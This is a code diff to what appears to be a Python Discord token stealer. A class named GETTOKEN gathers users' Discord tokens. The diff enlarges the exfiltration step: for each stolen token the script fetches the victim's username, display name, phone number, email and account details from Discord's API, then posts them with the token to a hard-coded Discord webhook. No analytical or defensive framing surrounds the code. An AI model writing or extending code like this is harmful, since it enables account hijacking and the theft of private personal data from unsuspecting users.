@@ -138,6 +138,36 @@ class GETTOKEN:
 
 toki = GETTOKEN()
 token = toki.gettokens()
-url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
-payload = {"content":f"Token: {token}"}
-response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})
+
+for t in token:
+    headers = {"Authorization": f"Bearer {t}"}
+    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+    
+    if response.status_code == 200:
+        user_data = response.json()
+
+        discord_username = user_data.get("username", "Unknown")
+        display_name = user_data.get("global_name", "No Display Name")  # Correct field
+        premium_type = user_data.get("premium_type", 0)
+        phone_number = user_data.get("phone", "N/A")
+        email = user_data.get("email", "N/A")
+        email_verified = user_data.get("verified", False)
+
+        webhook_url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
+        
+        message = f"""
+        **Token**: {t}
+        
+        **Token Info**
+        - Discord Username: {discord_username}
+        - Display Name: {display_name}
+        - Premium Type: {premium_type}
+        - Phone Number: {phone_number}
+        - Email: {email}
+        - Email Verified: {email_verified}
+        """
+        
+        payload = {"content": message}
+        requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+    else:
+        pass
